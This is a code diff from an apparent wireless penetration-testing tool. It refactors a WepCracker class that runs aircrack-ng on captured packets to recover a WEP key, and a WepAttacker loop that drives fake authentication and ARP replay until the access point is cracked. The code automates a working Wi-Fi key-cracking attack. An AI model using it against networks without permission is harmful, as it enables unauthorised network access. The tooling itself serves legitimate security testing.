@@ -330,7 +330,7 @@ class ArpReplay(UpdatableProcess):
         self.cap_path = None  # file was deleted with tmp_dir
 
 
-class WepCracker(object):
+class WepCracker(UpdatableProcess):
     """
     Aircrack-ng can recover the WEP key once enough encrypted packets have been captured with airodump-ng. This part
     of the aircrack-ng suite determines the WEP key using two fundamental methods. The first method is via the PTW
@@ -350,35 +350,18 @@ class WepCracker(object):
         """
         WepCracker process states.
         """
-        ok = 0  # cracking or waiting for more IVs
-        new = 1  # just started
-        terminated = 100
+        CRACKING = 0
+        """Cracking or waiting for more IVs."""
+        STARTED = 2
+        """Process just started."""
+        TERMINATED = 100
+        """Process have been terminated. By self.stop() call, on its own or by someone else."""
 
     def __init__(self, cap_filepath, ap):
+        self.state = self.State.STARTED
+
         self.cap_filepath = cap_filepath
         self.ap = ap
-
-        self.process = None
-        self.state = None
-        self.tmp_dir = None
-
-        # process' stdout, stderr for its writing
-        self.process_stdout_w = None
-        self.process_stderr_w = None
-        # process' stdout, stderr for reading
-        self.process_stdout_r = None
-        self.process_stderr_r = None
-
-    def start(self):
-        self.state = self.__class__.State.new
-        self.tmp_dir = tempfile.TemporaryDirectory()
-
-        # temp files (write, read) for stdout and stderr
-        self.process_stdout_w = tempfile.NamedTemporaryFile(prefix='wepcrack-stdout', dir=self.tmp_dir.name)
-        self.process_stdout_r = open(self.process_stdout_w.name, 'r')
-
-        self.process_stderr_w = tempfile.NamedTemporaryFile(prefix='wepcrack-stderr', dir=self.tmp_dir.name)
-        self.process_stderr_r = open(self.process_stderr_w.name, 'r')
 
         cmd = ['aircrack-ng',
                '-a', '1',
@@ -386,96 +369,55 @@ class WepCracker(object):
                '-q',  # If set, no status information is displayed.
                '-l', 'psk.hex',  # Write the key into a file.
                self.cap_filepath]
-        self.process = subprocess.Popen(cmd, cwd=self.tmp_dir.name,
-                                        stdout=self.process_stdout_w, stderr=self.process_stderr_w,
-                                        universal_newlines=True)
         # NOTE: Aircrack-ng does not flush when stdout is redirected to file and -q is set.
-        self.state = self.__class__.State.ok
-        logger.debug('WepCracker started; cwd=' + self.tmp_dir.name + ', ' +
-                     'stdout @ ' + self.process_stdout_w.name +
-                     ', stderr @ ' + self.process_stderr_w.name)
+        super().__init__(cmd)  # start process
 
-    def update_state(self):
+    def __str__(self):
+        return '<{!s} state={!s}>'.format(
+            type(self).__name__, self.state)
+
+    def update(self):
         """
         Update state of running process from process' feedback.
         Read new output from stdout and stderr, check if process is alive.
         Aircrack-ng does not flush when stdout is redirected to file and -q is set. Complete stdout is available
         in the moment of termination of aircrack-ng.
         """
-        # is process running?
-        if self.process.poll() is not None:
-            self.state = self.__class__.State.terminated
+        super().update()
+        # Is process running? State would be changed after reading stdout and stderr.
+        self.poll()
 
         # check every added line in stdout
-        for line in self.process_stdout_r:
-            if 'Failed. Next try with' in line:
-                if self.state != self.__class__.State.terminated:
-                    self.state = self.__class__.State.ok
-            elif 'KEY FOUND!' in line:
-                if self.state != self.__class__.State.terminated:
-                    self.state = self.__class__.State.ok
-                self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.hex'))
-                logger.debug('WepCracker found key!')
-            elif 'Decrypted correctly:' in line:
-                if '100%' not in line:
-                    # Incorrect decryption?
-                    logger.warning(line)
+        if self.stdout_r and not self.stdout_r.closed:
+            for line in self.stdout_r:
+                if 'Failed. Next try with' in line:
+                    if self.state != self.__class__.State.TERMINATED:
+                        self.state = self.__class__.State.CRACKING
+                elif 'KEY FOUND!' in line:
+                    if self.state != self.__class__.State.TERMINATED:
+                        self.state = self.__class__.State.CRACKING
+                    self.ap.save_psk_file(os.path.join(self.tmp_dir.name, 'psk.hex'))
+                    logger.debug('WepCracker found key!')
+                elif 'Decrypted correctly:' in line:
+                    if '100%' not in line:
+                        # Incorrect decryption?
+                        logger.warning(line)
 
         # check stderr
-        if self.process_stderr_r and not self.process_stderr_r.closed:
-            for line in self.process_stderr_r:  # type: str
+        if self.stderr_r and not self.stderr_r.closed:
+            for line in self.stderr_r:  # type: str
                 # NOTE: stderr should be empty
                 logger.warning("Unexpected stderr of 'aircrack-ng': '{}'. {}".format(line, str(self)))
 
-    def stop(self):
-        """
-        Stop running process.
-        If the process is stopped or already finished, exitcode is returned.
-        In the case that there was not any process, nothing happens.
-        :return:
-        """
-        if self.process:
-            exitcode = self.process.poll()
-            if exitcode is None:
-                self.process.terminate()
-                time.sleep(1)
-                self.process.kill()
-                exitcode = self.process.poll()
-                logger.debug('WepCracker killed')
-
-            self.process = None
-            self.state = self.__class__.State.terminated
-            return exitcode
-
-    def clean(self):
-        """
-        Clean after running process.
-        Running process is stopped, temp files are closed and deleted,
-        :return:
-        """
-        logger.debug('WepCracker clean')
-        # if the process is running, stop it and then clean
-        if self.process:
-            self.stop()
-        # close opened files
-        self.process_stdout_r.close()
-        self.process_stdout_r = None
-
-        self.process_stdout_w.close()
-        self.process_stdout_w = None
-
-        self.process_stderr_r.close()
-        self.process_stderr_r = None
-
-        self.process_stderr_w.close()
-        self.process_stderr_w = None
-
-        # remove tmp
-        self.tmp_dir.cleanup()
-        self.tmp_dir = None
-
-        # remove state
-        self.state = None
+        # Change state if process was not running in the time of poll() call in the beginning of this method.
+        # NOTE: Process' poll() needs to be called in the beginning of this method and returncode checked in the end
+        # to ensure all feedback (stdout and stderr) is read and states are changed accordingly.
+        # If the process exited, its state is not changed immediately. All available feedback is read and then
+        # the state is changed to self.State.TERMINATED. State, flags,stats and others can be changed during reading
+        # the available feedback even if the process exited. But self.State.TERMINATED is assigned here if
+        # the process exited.
+        if self.returncode is not None:
+            self.state = self.State.TERMINATED
 
 
 class WepAttacker(object):
@@ -563,24 +505,18 @@ class WepAttacker(object):
                         logger.debug(arp_replay)
                         time.sleep(1)
 
-                    cracker = WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap)
-                    cracker.start()
+                    with WepCracker(cap_filepath=capturer.capturing_cap_path, ap=self.ap) as cracker:
+                        while not self.ap.is_cracked():
+                            fake_authentication.update()
+                            arp_replay.update()
+                            cracker.update()
 
-                    while not self.ap.is_cracked():
-                        fake_authentication.update()
-                        arp_replay.update()
-                        cracker.update_state()
+                            logger.debug(fake_authentication)
+                            logger.debug(arp_replay)
+                            logger.debug(cracker)
+                            logger.info('#IV = ' + str(capturer.get_iv_sum()))
 
-                        logger.debug(str(fake_authentication))
-                        logger.debug(arp_replay)
-
-                        logger.debug('WepCracker: ' + str(cracker.state))
-
-                        logger.info('#IV = ' + str(capturer.get_iv_sum()))
-                        time.sleep(2)
-                    logger.info('Cracked ' + str(self.ap))
-
-                    cracker.stop()
-                    cracker.clean()
-                    capturer.stop()
-                    capturer.clean()
+                            time.sleep(2)
+                        logger.info('Cracked ' + str(self.ap))
+                        capturer.stop()
+                        capturer.clean()
